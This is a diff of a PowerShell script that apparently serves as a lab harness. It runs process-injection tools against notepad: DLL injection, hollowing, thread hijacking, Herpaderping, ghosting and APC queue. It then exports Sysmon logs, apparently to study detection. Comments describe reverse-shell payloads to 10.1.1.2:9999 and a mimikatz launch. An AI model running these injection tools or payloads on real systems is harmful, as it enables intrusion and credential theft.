@@ -1,4 +1,4 @@
-﻿function Inject-Process {
+function Inject-Process {
 
     <#
         
@@ -120,7 +120,7 @@
 
         $target_pid = get-process notepad | select -ExpandProperty ID
     
-        C:\Users\IEUser\Documents\Unmonitored\DLLInjection\RemoteDLLInjector32.exe $target_pid  C:\Users\IEUser\Documents\Unmonitored\DLLInjection\dll_spawns_calc_32.dll
+        & "$home_folder\DLLInjection\RemoteDLLInjector32.exe" $target_pid  "$home_folder\DLLInjection\dll_spawns_calc_32.dll"
 
         $target_process_name = "notepad.exe"
         }
@@ -134,7 +134,7 @@
 
         $target_pid = get-process notepad | select -ExpandProperty ID
 
-        cmd.exe /c 'C:\Users\IEUser\Documents\Unmonitored\PEInjection\Shellcode Injection via Remote Thread (shell x64 revshell).exe' $target_pid
+        cmd.exe /c "$home_folder\PEInjection\Shellcode Injection via Remote Thread (shell x64 revshell).exe" $target_pid
 
         $target_process_name = "notepad.exe"
 
@@ -146,7 +146,7 @@
         Write-Host "[*] Process Hollowing - rev shell" -ForegroundColor Cyan
 
         # Current payload is a x86 rev shell to 10.1.1.2:9999 
-        Start-Job {C:\users\IEUser\Documents\Unmonitored\ProcessHollowing\ProcessHollowing.exe} | out-null
+        Start-Job {& $using:home_folder\ProcessHollowing\ProcessHollowing.exe} | out-null
 
         Start-Sleep -Seconds 2
 
@@ -166,7 +166,7 @@
         $target_pid = get-process notepad | select -ExpandProperty ID
 
         # current payload is a x64 reverse shell to 10.1.1.2:9999
-        start-job {C:\Users\IEUser\Documents\Unmonitored\ThreadHijacking\ThreadHijacking.exe $using:target_pid} | Out-Null
+        start-job {& "$using:home_folder\ThreadHijacking\ThreadHijacking.exe" $using:target_pid} | Out-Null
 
         $target_process_name = "notepad.exe"
         }
@@ -178,7 +178,7 @@
 
         # Run Exploit
         # Both payloads (calc and rev shell) work, but neither allows any process to persist long enough for investigation
-        explorer C:\Users\IEUser\Documents\Unmonitored\SetWindowsHookEx\SetWindowsHookExInjector.exe
+        & "$home_folder\SetWindowsHookEx\SetWindowsHookExInjector.exe"
 
         Start-Sleep -Seconds 2
         $target_pid = get-process conhost | select -ExpandProperty ID
@@ -199,7 +199,7 @@
 
         Write-Host "[*] Process Herpaderping - rev shell" -ForegroundColor Cyan
 
-        start-job {C:\Users\IEUser\Documents\Unmonitored\ProcessHerpaderping\ProcessHerpaderping.exe C:\Users\IEUser\Documents\Unmonitored\ProcessHerpaderping\shell-x64_stageless_9999.exe C:\Users\IEUser\Documents\Unmonitored\notepad.exe C:\Users\IEUser\Documents\Unmonitored\ProcessHerpaderping\calc.exe} | out-null
+        start-job {& $using:home_folder\ProcessHerpaderping\ProcessHerpaderping.exe $using:home_folder\ProcessHerpaderping\shell-x64_stageless_9999.exe $using:home_folder\Unmonitored\notepad.exe $using:home_folder\ProcessHerpaderping\calc.exe} | out-null
 
         $target_pid = ""
         $limit = 1000
@@ -226,7 +226,7 @@
         #Write-Host "[*] Suspending process $($target_pid) prior to injection" -ForegroundColor Yellow
         #C:\Users\IEUser\Documents\Unmonitored\PSTools\pssuspend64.exe $target_pid -accepteula
 
-        start-job { C:\Users\IEUser\Documents\Unmonitored\APCQueue\APC-Queue-Injection-x64-calc.exe } | Out-Null
+        start-job {& $using:home_folder\APCQueue\APC-Queue-Injection-x64-calc.exe } | Out-Null
 
         $target_process_name = "notepad"
         }
@@ -280,10 +280,10 @@
         Write-Host "[*] Process Ghosting - launches mimikatz"-ForegroundColor Cyan
 
         # The exploit deletes the injected into process as part of it, so we must copy this so the exploit is re-runnable
-        copy-item C:\windows\system32\notepad.exe -Destination C:\Users\IEUser\Documents\Unmonitored\ProcessGhosting\notepad.exe
+        copy-item C:\windows\system32\notepad.exe -Destination $home_folder\ProcessGhosting\notepad.exe
 
         # Conduct exploit using the encrypted mimikatz payload
-        start-job {C:\Users\IEUser\Documents\Unmonitored\ProcessGhosting\KingHamlet.exe C:\Users\IEUser\Documents\mimikatz.exe.khe password C:\Users\IEUser\Documents\Unmonitored\ProcessGhosting\notepad.exe} | Out-Null
+        start-job {& $using:home_folder\ProcessGhosting\KingHamlet.exe $using:home_folder\mimikatz.exe.khe password $using:home_folder\ProcessGhosting\notepad.exe} | Out-Null
 
         $target_pid = (get-process -name notepad).Id # this may look odd but it's the only way to grab the process ID easily 
 
@@ -296,7 +296,7 @@
 
         Write-Host "[*] Transacted Hollowing - rev shell" -ForegroundColor Cyan
 
-        C:\Users\IEUser\Documents\Unmonitored\transacted_hollowing\transacted_hollowing64.exe C:\Users\IEUser\Documents\Unmonitored\transacted_hollowing\shell-x64_stageless_9999.exe C:\Users\IEUser\Documents\Unmonitored\transacted_hollowing\calc.exe |out-null
+        & $home_folder\Unmonitored\transacted_hollowing\transacted_hollowing64.exe $home_folder\transacted_hollowing\shell-x64_stageless_9999.exe $home_folder\transacted_hollowing\calc.exe |out-null
 
         Start-Sleep -Seconds 5
 
@@ -350,9 +350,9 @@
 
     Write-Host "[*] Injection Complete. Gathering Logs and cleaning up"
 
-    C:\windows\system32\wevtutil.exe epl Application "C:\users\IEUser\Documents\Results\$($foldername)\application.evtx"
+    C:\windows\system32\wevtutil.exe epl Application "$($results_folder)\$($foldername)\application.evtx"
 
-    C:\windows\system32\wevtutil.exe epl Microsoft-Windows-Sysmon/Operational "C:\users\IEUser\Documents\Results\$($foldername)\sysmon.evtx"
+    C:\windows\system32\wevtutil.exe epl Microsoft-Windows-Sysmon/Operational "$($results_folder)\$($foldername)\sysmon.evtx"
 
     $Get_injectedthread_results > (join-path -path $destination_folder -ChildPath GIT.txt)
 
